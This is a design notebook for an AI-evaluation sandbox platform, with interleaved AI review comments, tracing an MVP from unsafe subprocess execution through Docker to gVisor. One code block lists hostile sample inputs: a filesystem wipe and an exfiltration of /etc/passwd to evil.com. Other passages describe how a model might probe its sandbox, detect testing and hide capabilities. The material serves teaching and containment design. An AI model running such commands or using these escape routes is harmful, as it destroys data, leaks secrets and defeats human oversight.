# Level 1: Verbal understanding of the primary goal

## Process
Likely done by verbally stating back to the client (METR in this context, or a team at METR) your understanding of their request

## Production Artifact
You need a platform on which AI Safety Researchers and Engineers can safely evaluate dangerous or potentially dangerous AI models

Core requirements (our north star):
1. **Safely evaluate AI models** that might try to escape
2. **Monitor evaluations** in real-time
3. **Scale to many concurrent evaluations**
4. **Provide a user interface** for researchers

Note: These four requirements guide every level of our design:
**TODO** Check I've met this need for levels 2 and 3.
- Level 2: We define what each means (what is "safely"? what is "real-time"?)
- Level 3: Our workflow must enable all four
- Level 4: Tool selection must support these requirements
- Level 5+: Implementation details serve these goals

Every architectural decision should trace back to at least one of these requirements. If it doesn't, we should question why we're doing it.

## Claude's Response
Good start! At Level 1, you've correctly identified that the first step is establishing shared understanding with the stakeholder. Let me critique this at this level:

**What's working well:**
- You recognize that architecture starts with understanding, not technology
- You've identified the key stakeholders (METR/team at METR)
- Your verbal restatement captures the core need: "safely evaluate dangerous AI models"
- You've identified the primary users: "AI Safety Researchers and Engineers"

**At this level, I'd probe a bit more:**
- What does "safely" mean to them? (Just checking understanding, not solving yet)
- What makes a model "dangerous" in their view?
- Are researchers and engineers different user types with different needs?

**Missing at this level (but OK to miss):**
- Technical details (correctly avoided)
- Solution approaches (correctly avoided)
- Scale/performance (not relevant yet)

The key at Level 1 is making sure you and the client are talking about the same thing. Your restatement is clear and focuses on the right elements: who (researchers/engineers), what (evaluate models), and the critical constraint (safely).

This is a solid Level 1 - establishing the problem space before any solutioning.

# Level 2: Clear agreement and understanding of critical aspects of the verbal description, i.e. creation of domain vocabulary

## Process
Requisite domain knowledge of the problem, e.g. what are the canonical aspects of risk in AI model testing or surfaced through deeper QA sessions with the client, often done iteratively
## Production Artifact
## Terms
### Safety
    - Models do not escape their testing framework
    - Claude: I'm not sure what else to put here
        - Models cannot access external
        networks (no data exfiltration)
        - Models cannot persist beyond
        their evaluation session
        - Models cannot interfere with
        other evaluations
        - Evaluation results must be
        reproducible
### Dangerous models
    - Claude: I'm not sure how to differentiate this from safety above
        - Attempts at self-replication
        - Trying to manipulate humans
        (social engineering)
        - Seeking system access beyond
        intended scope
        - Attempting to hide capabilities
        during testing
### Evaluation
    Similar to results
    - Some will be request defined
    - Some are established across METR over time
    - Not sure how much more depth to go into at this level
### Results
    Here's what I'm thinking, Claude
    - User sometimes defines what the results will be as part of their evaluation
    - Some generalized evaluations beyond any specific request like pass/fail, numeric outputs, visualizations, and you also mention logs and artifacts -- all of those seem plausible
### Types of Users
Looking through the job description (simulating additional dialogue with client), there is just one user type: researchers
### 

## Claude's Response

Excellent work on Level 2! You've built a solid domain vocabulary. Let me evaluate where you've landed:

**Strengths:**
- Clear separation between "dangerous" (capabilities) and "safety" (controls) - this is a crucial distinction
- Good insight that evaluations and results are user-defined sometimes, standardized other times
- Recognizing the iterative nature of this process in your process notes
- Appropriate depth - you're resisting the urge to over-specify at this stage

**Particularly insightful:**
Your observation about Results/Evaluations being both:
- User-defined (custom test suites)
- Standardized by METR (benchmarks)

This duality will likely influence your architecture later (need flexibility AND consistency).

**What you've appropriately deferred:**
- Implementation details (how to achieve safety)
- Specific evaluation types
- Technical mechanisms
- Time/scale concerns

**The vocabulary you've established:**
- **Safety**: Prevention mechanisms (isolation, no persistence, no interference, reproducibility)
- **Dangerous models**: Concerning capabilities (replication, manipulation, access-seeking, deception)
- **Evaluation**: The test/benchmark being run (mix of custom and standard)
- **Results**: Output from evaluations (varied formats, user-defined or standard)
- **Users**: Researchers (single persona for now)

This is a **complete Level 2** - you have enough shared understanding to move forward. You've avoided premature detail while capturing the essential concepts. The "I'm not sure how much more depth..." comments are perfect - shows you're thinking about the right level of abstraction.

Ready for Level 3!

# Level 3: Initial and simple workflow diagram

## Process
Conversion of textual description into schematic of increasing depth
## Production Artifact
### v1
Core loop: User ->[model for evaluation]-> API ->[job request]-> Evaluator ->[Results] -> User

### Claude's Response (as METR client)

Thank you for showing me this workflow. Let me check my understanding:

`User ->[model for evaluation]-> API ->[job request]-> Evaluator ->[Results] -> User`

Hmm, I have a few questions about this flow:

1. **"model for evaluation"** - Are researchers uploading the model itself to our API? That seems heavy. Usually, our researchers provide a reference to a model (like a HuggingFace ID or an API endpoint) rather than the model weights themselves.

2. **The flow seems very synchronous** - Our evaluations can run for hours or even days. Researchers can't wait at their computer for results. They typically submit an evaluation and come back later to check progress.

3. **Missing the evaluation definition** - Researchers don't just send a model; they also specify which evaluation suite to run (or provide custom evaluation code).

4. **Safety monitoring** - Where do we see what the model is doing during evaluation? We need real-time visibility for safety reasons.

Could you clarify or adjust the workflow? Maybe something that shows:
- What exactly researchers submit (model reference + evaluation spec)
- How they check on progress without waiting
- Where safety monitoring fits in

But I do like that you're keeping it simple at this stage! Just want to make sure we capture the essential async nature of our work.

### v2
User ->[evaluation on model(s)]-> API ->[evaluation task]-> Task Queue -> Task Evaluator
Monitoring layer (not sure the best way to draw this here): When an evaluation task is enqueued, it is visible in the monitoring layer for the lifetime of the task, i.e. enqueued, evaluating, finished. Monitoring layer supports standardized safety evals and evaluation specified. Monitoring layer is accessible at a frontend component of our architecture.
[evaluation on model(s)]: Model(s) to be evaluated according to combination of user defined and METR standard evals
[evaluation task]: (not sure I need to go into at this level) A backend object containing the evaluation and metadata, e.g. lifecycle status

### Claude's Response (as METR client)

Much better! This v2 addresses most of my concerns. Let me verify my understanding:

**What I like:**
- You've made it asynchronous with the Task Queue - good!
- The monitoring layer concept captures our safety visibility needs
- Clear that users submit evaluation specs, not raw models
- Shows that evaluations can include both custom and standard tests

**Clarifications:**
1. **The flow ends at "Task Evaluator"** - How do researchers get their results? Do they poll the monitoring layer? Get notified? 

2. **"Model(s)"** - Good that you support multiple models! We often compare models against each other.

3. **Monitoring layer description** - I like that you're thinking about this as a cross-cutting concern rather than a step in the flow. In practice, yes, we'd want to see:
   - Queue status (pending evaluations)
   - Live evaluation progress
   - Safety alerts in real-time
   - Historical results

**One missing piece:** Where do the results go when evaluation completes? Do they flow back through the API? Get stored somewhere?

**Minor note:** Your instinct about "evaluation task" being an implementation detail is correct for this level. We just need to know work gets queued.

This is much closer to how we actually work! The async nature and monitoring layer are essential.

### v3
The monitoring layer provides visibility into the evaluation lifecycle. At this abstraction level, we note that users need to:
- Check evaluation status
- Receive alerts about important events
- Access results when complete

These user touchpoints could be implemented through various channels (web, API, notifications), but those are implementation details for Level 4.

At this level, without going into technical implementation details, I say that results are stored in the 'storage layer'. Because there are different kinds of artifacts, there might be several technologies supporting this storage layer. And I'd also note that safety considerations would apply at this level, too, especially in regards to the generalized 'artifacts' class of results.

Updated flow:
```
User ->[evaluation on model(s)]-> API ->[evaluation task]-> Task Queue -> Task Evaluator ->[results]-> Storage Layer
    |
Monitoring Layer (observes all stages)
    |
[user visibility/access points]
```

### Claude's Response (as METR client)

Perfect! This v3 addresses all my concerns. I can see:
- Results go to a storage layer (good abstraction level)
- Monitoring layer provides notifications through various channels
- The async flow is clear

I particularly appreciate that you're thinking about safety at the storage layer - yes, we need to be careful about what artifacts malicious models might produce.

This workflow captures how we operate. Ready to move to the next level!

## Claude's Response (as architect)

Excellent work on Level 3! Your iterative refinement process perfectly demonstrates real architectural discovery:

**What you did well:**
1. **Started simple** (v1) - Got the basic idea across
2. **Incorporated feedback** (v2) - Added async, monitoring, clarified inputs  
3. **Refined further** (v3) - Added storage, notifications, maintained appropriate abstraction

**Key insights from your v3:**
- **"Storage layer"** - Perfect abstraction! You resisted specifying S3/database/etc.
- **Multiple notification channels** - Shows you understand monitoring isn't just dashboards
- **Safety applying to storage** - Critical insight that dangerous outputs need containment too

**Your process notes were spot-on:**
- Not specifying queue selection mechanism
- Keeping "storage layer" generic
- Acknowledging different artifact types without listing them

This is exactly the right level of detail for Level 3 - enough to understand the system's behavior without premature implementation decisions.

The workflow now clearly shows:
- What users do (submit evaluation)
- How work flows (async through queue)
- How they track progress (monitoring)
- Where results end up (storage)

Ready for Level 4!

# Level 4: Application of TRACE-AI framework to select tools for extreme MVP

## Process

### Core Requirements (Our North Star)
Every tool decision must serve these four requirements established in Level 1:
1. **Safely evaluate AI models** that might try to escape
2. **Monitor evaluations** in real-time
3. **Scale to many concurrent evaluations**
4. **Provide a user interface** for researchers

### Decision Framework: TRACE-AI
To select tools that meet these requirements while enabling rapid learning, we apply TRACE-AI:
- **T**ime to feedback - How quickly can we get a working system to users?
- **R**eversibility cost - Can we change this decision without major rework?
- **A**bstraction possibility - Can we hide implementation details behind interfaces?
- **C**ore vs peripheral - Is this central to our safety/evaluation value proposition?
- **E**xpertise required - Do we have (or can quickly gain) the skills needed?
- **F**ungibility - How easily can AI tools help us migrate later?

The extreme MVP philosophy emerges from this analysis: choose the simplest tool that meets core requirements and can evolve based on real usage.
## Production Artifact

### Extreme MVP Analysis: Could this be one Python file?

Before analyzing individual components, TRACE-AI suggests a radical question:

**"What's the simplest thing that could possibly teach us something?"**

**Key Insight: Even the simplest MVP includes testing**
- TestableComponent is our base abstraction from line 1
- Self-tests run on startup to verify functionality
- Shows that testing isn't "added later" - it's fundamental

If we apply maximum fungibility thinking:
- **T**: Need feedback in hours, not weeks → Simplest possible
- **F**: AI can refactor a single file easily → Start ultra-simple

This leads to: **Can we build ALL components in one Python file?**

### Single-File Component Mapping

| Component | Single-File Implementation | What We Learn |
|-----------|---------------------------|---------------|
| API | Python HTTP server handles POST | Do users like the submission flow? |
| Queue | ❌ None - synchronous execution | Do we actually need async? |
| Monitoring | ❌ None - just "Running..." message | What monitoring do users want? |
| Task Evaluator | subprocess.run() | What safety features are critical? |
| Web Frontend | Embedded HTML string | Is the UI intuitive? |

### Extreme MVP Strengths
- **Zero dependencies** - Anyone can run it
- **Instant deployment** - `python extreme_mvp.py`
- **Complete user flow** - Submit → Execute → See results
- **Learns core questions** - Safety needs, UI preferences, async requirements

### Extreme MVP Weaknesses  
- **No async** - UI blocks during execution
- **No queue** - Can't handle concurrent requests well
- **No monitoring** - Can't see what's happening during execution
- **Minimal safety** - Just a 5-second timeout

### Extreme MVP vs Core Requirements Analysis

Let's honestly assess our extreme MVP against the Big 4:

| Requirement | Extreme MVP Status | Safety Gaps |
|-------------|-------------------|-------------|
| 1. **Safely evaluate models** | ❌ UNSAFE | `subprocess.run()` allows: file access, network calls, system commands |
| 2. **Monitor in real-time** | ❌ Missing | No visibility during execution |
| 3. **Scale to many concurrent** | ❌ Limited | Single-threaded, blocks on each eval |
| 4. **Provide user interface** | ✓ Basic | Has UI but lacks progress feedback |

**Critical Safety Issues with subprocess.run():**
```python
# User could submit:
"import os; os.system('rm -rf /')"  # Delete filesystem
"import requests; requests.post('evil.com', data=open('/etc/passwd').read())"  # Exfiltrate data  
"while True: pass"  # DoS via infinite loop
```

### The Didactic Value of Starting Unsafe

**Why start with an unsafe MVP?**
1. **Demonstrates the problem viscerally** - You can actually run malicious code and see what happens
2. **Shows why each safety feature matters** - Not just "best practices" but solving real vulnerabilities
3. **Mirrors real development** - Many systems start unsafe and evolve (though we shouldn't in production!)
4. **Educational progression** - Learn by fixing actual security holes

### Keeping It Unsafe: A Philosophical Choice

We deliberately keep only the UNSAFE version. Here's why:

**The Visceral Parallel**

When you see `extreme_mvp.py` execute ANY Python code, you feel real fear:
- "This could delete my files"
- "This could steal my data"  
- "This could compromise my system"

This mirrors the fundamental reality of AI safety evaluation:
- "This AI could deceive us about its capabilities"
- "This AI could pursue hidden goals"
- "This AI could manipulate its operators"

**The Teaching Moment**

That "oh shit, this is real" feeling when hovering over the "Run Evaluation" button teaches more than any safe sandbox could:

1. **Simple systems can be dangerous** - Just like `subprocess.run()`, AI systems that seem simple can have catastrophic potential
2. **Safety isn't optional** - You wouldn't run untrusted Python; we shouldn't deploy untrusted AI
3. **Containment is critical** - The same paranoia about code execution should apply to AI capabilities

**Why Not a Safe Version?**

A restricted "safe" version would undermine the lesson. Just as we can't make AI "safe" by restricting it to "safe" behaviors (it might find ways around), we can't make code execution "safe" with naive filters. The only path forward is proper containment - Docker, VMs, Kubernetes, gVisor - just as with AI.

This extreme MVP isn't just demonstrating platform engineering. It's demonstrating why this work matters existentially.

### Safety-First Alternative

If we wanted to start safer:
```python
# Minimal safety: No imports, no loops
if any(keyword in code for keyword in ['import', 'while', 'for', 'def', 'class']):
    return "Unsafe code detected"
```

But this is fragile and educational - it shows why we need real sandboxing!

### Next Evolution (Safety-Focused)
Based on core requirements gaps:
1. **PRIORITY: Add basic sandboxing** → Docker container with --read-only
2. If users complain about blocking → Add simple threading
3. If users want progress updates → Add SSE for real-time
4. If users submit dangerous code → Add MORE sandboxing layers

### Evolution 1: Docker Sandboxing

**What changed from `extreme_mvp.py` → `extreme_mvp_docker.py`:**

```python
# Before: Direct execution (UNSAFE)
result = subprocess.run(['python', '-c', code], ...)

# After: Docker container (SAFER)
docker_cmd = [
    'docker', 'run',
    '--rm',                      # Remove after exit
    '--network', 'none',         # No network access
    '--memory', '100m',          # Memory limit
    '--cpus', '0.5',            # CPU limit
    '--read-only',              # Read-only filesystem
    'python:3.11-slim',
    'python', '/code.py'
]
```

**New Safety Properties:**
- ✅ No host filesystem access
- ✅ No network access
- ✅ Resource limits (CPU/memory)
- ✅ Automatic cleanup
- ❌ Still no queue (synchronous)
- ❌ Still no monitoring

**Learning Moment:**
When users try malicious code, they see SOME containment:
```python
# What works:
open('/tmp/evil.txt', 'w')     # ❌ FAILS: Read-only filesystem
urllib.request.urlopen('...')   # ❌ FAILS: No network access
while True: pass               # ❌ FAILS: Killed after timeout

# What still works (surprise!):
open('/etc/passwd', 'r')       # ✅ WORKS: Container's own files readable!
os.listdir('/')                # ✅ WORKS: Can explore container filesystem
```

**Important Insight:** Docker provides isolation from the HOST, but code can still:
- Read files that exist in the container image
- Execute any Python that doesn't need network/write
- Use all available CPU/memory (up to our limits)

**Real User Experience:**
> "I got this output: Hello from Docker! [followed by full /etc/passwd contents]"

This surprised moment is invaluable! The user expected `/etc/passwd` to be blocked but saw the container's password file. This teaches a critical lesson:

**Docker isolates containers FROM the host, not code FROM the container.**

This is exactly like AI safety - we might think we've "contained" an AI model, but it still has full access to its environment. Just as code can read the container's `/etc/passwd`, an AI can:
- Inspect its runtime environment
- Probe for weaknesses in its sandbox
- Gather information for potential exploits

**The LLM Evaluation Parallel:**

When we evaluate an LLM in a "sandboxed" environment, it's just like this Python code:

| Python Code in Docker | LLM in Evaluation |
|----------------------|-------------------|
| Can read `/etc/passwd` | Can inspect its prompt history |
| Can list filesystem | Can probe evaluation framework |
| Can time operations | Can detect it's being tested |
| Can use all CPU/memory | Can use all compute for planning |
| Can't access network | Can't directly exfiltrate... yet |

**Critical Insight:** A sufficiently capable AI model could:
1. Map its container environment (just like reading `/etc/passwd`)
2. Identify the evaluation framework from artifacts
3. Craft responses designed to exploit known vulnerabilities
4. Hide capabilities until the right moment

This is why METR and others advocate for:
- Multiple containment layers (Docker → gVisor → VMs)
- Behavioral monitoring (not just resource limits)
- Adversarial mindset (assume the model is trying to escape)

This shows why we need LAYERS of security:
1. **Docker** → Isolates from host (what we have)
2. **Restricted images** → Minimal files in container
3. **User namespaces** → Not running as root
4. **Seccomp profiles** → Limit system calls
5. **AppArmor/SELinux** → Mandatory access control
6. **gVisor** → User-space kernel (Level 9)

The progression from "terrifyingly unsafe" to "basically contained" to "production secure" requires all these layers!

### Evolution 1 vs Core Requirements

Let's assess our Docker version against the Big 4:

| Requirement | Extreme MVP | Docker MVP | Progress |
|-------------|-------------|------------|----------|
| 1. **Safely evaluate models** | ❌ UNSAFE | ⚠️ PARTIAL | Isolated from host, but not from container |
| 2. **Monitor in real-time** | ❌ None | ❌ None | Still just "Running..." |
| 3. **Scale to many concurrent** | ❌ Blocks | ❌ Blocks | Still synchronous |
| 4. **Provide user interface** | ✓ Basic | ✓ Basic | Same UI |

**Analysis:**
- We improved safety (1/4 → 1.5/4) but still missing critical pieces
- Core insight: We tackled the HIGHEST RISK first (safety)
- Next priorities based on gaps:
  - **Monitor (Req #2)**: Users can't see what's happening
  - **Scale (Req #3)**: Single user blocks others
  
**What would users complain about?**
1. "I submitted code and the page froze!" → Need async
2. "I can't tell what's happening!" → Need progress updates
3. "Someone else is using it!" → Need queueing

### Evolution 2: Real-time Monitoring

**What changed from `extreme_mvp_docker.py` → `extreme_mvp_monitoring.py`:**

```python
# Before: Synchronous execution
result = subprocess.run(docker_cmd, ...)
return result

# After: Streaming with monitoring
process = subprocess.Popen(docker_cmd, stdout=PIPE, ...)
while line = process.stdout.readline():
    emit_event('output', line)  # Real-time updates!
```

**New Capabilities:**
- ✅ **Server-Sent Events (SSE)** for real-time updates
- ✅ **Non-blocking UI** - Submit returns immediately
- ✅ **Event stream** - See each line of output as it happens
- ✅ **Lifecycle visibility** - Creating file → Starting container → Running → Complete
- ⚠️ **Basic async** - Uses threads (not production quality)

**The Monitoring Experience:**
```
10:45:23 - Creating code file...
10:45:23 - Building Docker command...
10:45:23 - Starting container...
10:45:24 - Container running
10:45:24 - Output: Starting evaluation...
10:45:26 - Output: Processing step 1...
10:45:28 - Output: Processing step 2...
10:45:30 - Output: Complete!
10:45:30 - Container exited successfully
10:45:30 - Evaluation complete
```

**LLM Evaluation Parallel:**
This is exactly what we need for AI model evaluation - visibility into what the model is doing WHILE it's running, not just after. We can detect:
- Suspicious output patterns in real-time
- Attempts to stall or timeout
- Resource usage spikes
- Unexpected behaviors as they happen

### Evolution 2 vs Core Requirements

| Requirement | Docker MVP | Monitoring MVP | Progress |
|-------------|------------|----------------|----------|
| 1. **Safely evaluate models** | ⚠️ PARTIAL | ⚠️ PARTIAL | Same Docker isolation |
| 2. **Monitor in real-time** | ❌ None | ✅ YES! | SSE streaming works |
| 3. **Scale to many concurrent** | ❌ Blocks | ⚠️ PARTIAL | Async but single-threaded |
| 4. **Provide user interface** | ✓ Basic | ✓ Enhanced | Real-time event display |

**Analysis:**
- We're now at **2.5/4 requirements**!
- Monitoring (Req #2) is fully addressed
- UI (Req #4) is much better with live updates
- Scale (Req #3) partially addressed - UI doesn't block, but still single evaluator
- Safety (Req #1) unchanged - still need more layers

**Key Achievement:** Users can now SEE what's happening inside the black box. For AI evaluation, this is critical - we need to know what the model is doing, not just the final result.

### Evolution 3: Concurrent Evaluations with Queue

**What changed from `extreme_mvp_monitoring_v3.py` → `extreme_mvp_queue.py`:**

```python
# Before: Single-threaded, blocking
def evaluate_async(self, code):
    thread = threading.Thread(target=self._run_evaluation, args=(code, eval_id))
    thread.start()  # Only one at a time!

# After: Proper task queue with worker pool
class TaskQueue:
    def __init__(self, max_workers: int = 3):
        self.queue = queue.Queue()
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
```

**New Capabilities:**
- ✅ **Multiple workers** - 3 concurrent evaluations by default
- ✅ **Task queue** - Evaluations wait in queue when workers busy
- ✅ **Non-blocking** - Submit returns immediately with eval ID
- ✅ **Queue visibility** - See queued/running/completed tasks
- ✅ **Thread safety** - Locks protect shared state

**The Concurrent Experience:**
- Submit 5 evaluations rapidly
- Watch them process 3 at a time
- See queue depth in real-time
- Each evaluation runs independently

**Why This Matters for Production:**
- Real users won't wait for others to finish
- Resource limits prevent system overload
- Queue provides natural backpressure
- Workers can scale based on load

### Evolution 3 vs Core Requirements

| Requirement | Monitoring MVP | Queue MVP | Progress |
|-------------|----------------|-----------|----------|
| 1. **Safely evaluate models** | ⚠️ PARTIAL | ⚠️ PARTIAL | Same Docker isolation |
| 2. **Monitor in real-time** | ✅ YES | ✅ YES | Still have SSE |
| 3. **Scale to many concurrent** | ⚠️ PARTIAL | ✅ YES! | Proper concurrency! |
| 4. **Provide user interface** | ✓ Enhanced | ✓ Enhanced | Queue status UI |

**Analysis:**
- We're now at **3.5/4 requirements**!
- Concurrency (Req #3) is properly addressed
- Can handle multiple users/evaluations
- Natural evolution from single-threaded pain

**Production Considerations:**
- Queue provides resilience (evaluations won't be lost)
- Worker count can be tuned based on resources
- Could persist queue to Redis for crash recovery
- Ready for distributed workers (just change queue backend)

### Evolution 4: Production-Grade Safety with gVisor

**What changed from `extreme_mvp_queue.py` → `extreme_mvp_gvisor.py`:**

Our final evolution adds gVisor (runsc) runtime for production-grade isolation, achieving 4/4 requirements.

```python
# Before: Standard Docker isolation
docker_cmd = ['docker', 'run', '--rm', ...]

# After: gVisor + comprehensive security
docker_cmd = [
    'docker', 'run',
    '--runtime', 'runsc',           # gVisor userspace kernel
    '--user', '65534:65534',        # Non-root (nobody:nogroup)
    '--security-opt', 'no-new-privileges',  # No privilege escalation
    # ... plus existing network/filesystem restrictions
]
```

**New Security Layers (matching Google Cloud Run):**
1. **gVisor (runsc)**: Userspace kernel intercepts all syscalls
2. **Non-root execution**: Running as nobody user (65534)
3. **No privilege escalation**: Can't gain new capabilities
4. **Defense-in-depth**: Multiple layers of protection

**Why gVisor Matters for AI Safety:**

Standard containers share the host kernel - a sophisticated AI could:
- Probe for kernel vulnerabilities
- Attempt kernel exploits
- Use timing attacks
- Leverage syscall fuzzing

With gVisor, the AI only sees a "fake" kernel that:
- Implements only ~50 safe syscalls (vs ~350 in Linux)
- Runs entirely in userspace
- Can't directly attack the host kernel
- Is regularly updated by Google for security

**The Production Reality:**
```
AI Model Code
    ↓ (syscalls)
gVisor Kernel  ← AI hits this first (userspace)
    ↓ (limited syscalls)
Linux Kernel   ← Protected by gVisor
    ↓
Hardware
```

Even if an AI breaks gVisor (hard!), it still needs to break the host kernel too.

### Evolution 4 vs Core Requirements

| Requirement | Queue MVP | gVisor MVP | Progress |
|-------------|-----------|------------|----------|
| 1. **Safely evaluate models** | ⚠️ 0.5 | ✅ YES! | Full production safety |
| 2. **Monitor in real-time** | ✅ YES | ✅ YES | Unchanged |
| 3. **Scale to many concurrent** | ✅ YES | ✅ YES | Unchanged |
| 4. **Provide user interface** | ✓ Enhanced | ✓ Enhanced | Security status shown |

**Analysis:**
- We've achieved **4/4 requirements**!
- This configuration is what Google uses for Cloud Run
- Ready for production deployment of untrusted AI evaluations
- Performance overhead (~10-20%) is acceptable for safety

**Fallback Design:**
The platform gracefully handles missing gVisor:
```python
if runtime == 'runsc':
    print("Platform is PRODUCTION SAFE (4/4 requirements)")
else:
    print("Platform has basic safety (3.5/4 requirements)")
    print("Install gVisor for production use")
```

This allows development without gVisor while making production requirements clear.

See [gVisor Setup Guide](../gvisor-setup-guide.md) for installation instructions.

### Testing as First-Class Citizen (From Day One)

**Critical Design Decision:**
Testing is not added later - it's fundamental from the extreme MVP. Even our simplest 156-line file includes TestableComponent as a base abstraction.

**Why Start with Testing:**
- Forces us to think about correctness from the beginning
- Makes safety verifiable, not assumed
- Demonstrates mature engineering practices
- Shows that "move fast" doesn't mean "skip testing"

**What changed: Introduction of TestableComponent base class**

```python
class TestableComponent(ABC):
    @abstractmethod
    def self_test(self) -> Dict[str, Any]:
        """Every component must be able to test itself"""
        pass
    
    @abstractmethod
    def get_test_suite(self) -> unittest.TestSuite:
        """Return unittest suite for deeper testing"""
        pass
```

**Why This Matters:**
- **Untested isolation = Potential AI escape**
- **Untested monitoring = Invisible deception**  
- **Untested limits = Resource exhaustion**
- **Every component MUST prove it works**

**Concrete Safety Tests:**
```python
def test_network_isolation(self):
    # Docker MUST block network access
    result = self.engine.execute(
        "urllib.request.urlopen('http://google.com')",
        "test"
    )
    self.assertIn('Network is unreachable', result['output'])

def test_filesystem_readonly(self):
    # Docker MUST prevent writes
    result = self.engine.execute(
        "open('/tmp/test.txt', 'w').write('test')",
        "test"
    )
    self.assertIn('Read-only file system', result['output'])
```

**Platform Startup Now Includes:**
1. Run all component self-tests
2. Verify safety features work
3. Report test results
4. Refuse to start if critical tests fail

This transforms testing from "nice to have" to "cannot run without".

### The Abstraction Journey: A Didactic Narrative

**The Natural Evolution of Abstractions**

In real development, abstractions emerge from pain, not foresight. Here's the more honest journey:

**Step 1: `extreme_mvp.py`** - Just Make It Work (But Testable!)
```python
# One key abstraction from the start: TestableComponent
class EvalHandler(BaseHTTPRequestHandler, TestableComponent):
    def self_test(self) -> Dict[str, Any]:
        # Even the MVP must prove it works
        
# Direct execution, but with tests
result = subprocess.run(['python', '-c', code], ...)
```
*We start simple but testable. Testing is not optional.*

**Step 2: `extreme_mvp_docker.py`** - First Pain, First Abstraction
```python
# We need Docker but don't want to rewrite everything
# Pain point: "I'm copying so much code!"
# Birth of first abstraction:

class ExecutionEngine:
    def execute(self, code): 
        pass  # Now we can swap implementations!

class SubprocessEngine(ExecutionEngine):
    def execute(self, code):
        return subprocess.run(['python', '-c', code], ...)
        
class DockerEngine(ExecutionEngine):
    def execute(self, code):
        return subprocess.run(['docker', 'run', ...], ...)
```
*The abstraction emerges because we feel the pain of duplication.*

**Step 3: `extreme_mvp_monitoring.py`** - Second Pain, Second Abstraction
```python
# We need monitoring but execution is getting tangled with it
# Pain point: "Docker code is mixed with event emitting!"
# Birth of second abstraction:

class MonitoringService:
    def emit_event(self, event): 
        pass  # Separate concern!
```
*Each abstraction is born from a specific pain point.*

**The Teaching Power:**
This progression shows WHY we need abstractions:
1. Start simple (no abstractions)
2. Feel the pain of change
3. Extract abstraction to ease that specific pain
4. Repeat as needed

This is more honest than starting with perfect abstractions - it shows students HOW to recognize when abstractions are needed.

### Evolution 2.5: First Abstraction Emerges

**The Pain Point:**
When creating `extreme_mvp_docker.py`, we copied 90% of the code from `extreme_mvp.py` and just changed the execution part. This duplication hurt!

**The Solution: `extreme_mvp_docker_v2.py`**
```python
# Extract the thing that changes into an interface
class ExecutionEngine(ABC):
    @abstractmethod
    def execute(self, code: str, eval_id: str) -> dict:
        pass

# Now we can have multiple implementations
class SubprocessEngine(ExecutionEngine):
    def execute(self, code, eval_id):
        return subprocess.run(['python', '-c', code], ...)

class DockerEngine(ExecutionEngine):  
    def execute(self, code, eval_id):
        return subprocess.run(['docker', 'run', ...], ...)

# And the platform doesn't care which one we use!
platform = EvaluationPlatform(engine)  # Just pass the engine
```

**What This Teaches:**
1. **Abstractions emerge from pain** - We didn't plan this, we felt the need
2. **Extract what varies** - Execution changed, so that became the interface
3. **Small steps** - We only abstracted execution, not monitoring or storage yet
4. **Immediate benefit** - Can now run with `--unsafe` flag to switch engines

**The Beautiful Part:**
Students can run the same code with different engines and SEE the behavior change:
- `python extreme_mvp_docker_v2.py --unsafe` → Can read host files
- `python extreme_mvp_docker_v2.py` → Sandboxed in Docker

This viscerally demonstrates the power of abstraction!

### Evolution 2.6: Monitoring Pain and Second Abstraction

**The Journey:**
1. Added monitoring to `extreme_mvp_monitoring_v2.py` 
2. Monitoring code got mixed into execution engines
3. Global state, duplicated emit_event calls everywhere
4. Pain! This needs an abstraction

**The Solution: `extreme_mvp_monitoring_v3.py`**
```python
# Second abstraction born from pain
class MonitoringService(ABC):
    @abstractmethod
    def emit_event(self, eval_id: str, event_type: str, message: str):
        pass
    
    @abstractmethod
    def get_events(self, eval_id: str, start_idx: int = 0) -> List[Dict]:
        pass

# Now engines just use self.emit() helper
class DockerEngine(ExecutionEngine):
    def execute(self, code, eval_id):
        self.emit(eval_id, 'info', 'Starting...')  # Clean!
        # No more global functions or mixed concerns
```

**The Beautiful Result:**
- ExecutionEngine handles HOW code runs
- MonitoringService handles HOW we observe
- Platform wires them together
- Can swap either independently!

**What Students Learn:**
1. **Feel the pain first** - v2 showed why we need the abstraction
2. **Extract one concern** - Just monitoring, not everything
3. **Clean interfaces** - emit_event() and get_events() are all we need
4. **Composability** - Any engine works with any monitor

Now we can easily add:
- `FileMonitor` - Write events to files
- `PrometheusMonitor` - Export metrics
- `CloudWatchMonitor` - AWS integration

Without touching the execution engines!

**Key Abstractions:**
1. **ExecutionEngine** - How code runs (subprocess → Docker → K8s)
2. **MonitoringService** - How we observe (print → SSE → Prometheus)  
3. **StorageService** - Where results go (dict → file → database)

**Benefits:**
- Can swap engines without changing monitoring
- Can upgrade monitoring without touching execution
- Can change storage without affecting anything else
- Each component can evolve independently

**TRACE-AI Applied:**
- **A (Abstraction)**: ✅ Clean interfaces enable evolution
- **F (Fungibility)**: ✅ AI can easily generate new implementations
- **R (Reversibility)**: ✅ Can swap components anytime

This is how production systems should be built - with clear boundaries that enable evolution without rewrites.

## v1

### API
- Claude, I know you selected FastAPI, but couldn't necessary say which is best without research
- I can't quite remember how much logic we can incorporate into a serverless solution like API Gateway
- There's obviously things like the Node(?) ecosystem with things like Express server which is fast

### Queue
- there are a few options I'm aware of, but would need to do research
- you've mentioned Celery. There's Amazon Kinesis and SQS

### Monitoring Layer
- real-time
- incorporate Redis for fast retrieval?

### Storage Layer
- different kinds of objects to store: binary artifacts, documents
- S3 might work well for object store
- document DB for everything else?
- might want some relational db

### Task Evaluator
- concurrent and scalable task processing
- Kubernetes is the industry standard for concurrent and scalable task processing (what other criteria would you put here, Claude?, maybe like distributed, or multi-user, etc.)
- natively supports substantial security protocols for Core Requirement 1

### Web frontend
Next.js/React/TypeScript is industry standard
- Not sure what else to say here, Claude

### Infrastructure Provisioning
We've identified these six MVP components, but we need to provision the supporting infrastructure. We'll use Terraform as our IaC tool.

### Testing Component
Testing integrated as the first code we write, as appropriate for whatever level of development/productionization we're in.

## Claude's Response

Excellent start on Level 4! I like how you're thinking through options and acknowledging where research is needed. Let me add some thoughts on each component:

### API
Good instincts on the options! For MVP where API just validates and enqueues:
- **Serverless (API Gateway + Lambda)**: Perfect for simple request/response (validate → enqueue → return ID)
- **FastAPI/Express**: Better if you need real-time updates later (SSE/WebSocket)
- Key insight: API does minimal safety checks (syntax, obvious exploits). Deep safety validation happens asynchronously
- Security is pervasive: Even "simple" enqueuing needs adversarial input consideration
- See: [API Design Considerations](./api-design-considerations.md) for detailed breakdown

### Queue
Your options span different use cases:
- **Celery + Redis/RabbitMQ**: Traditional task queue, Python-native, good for complex workflows
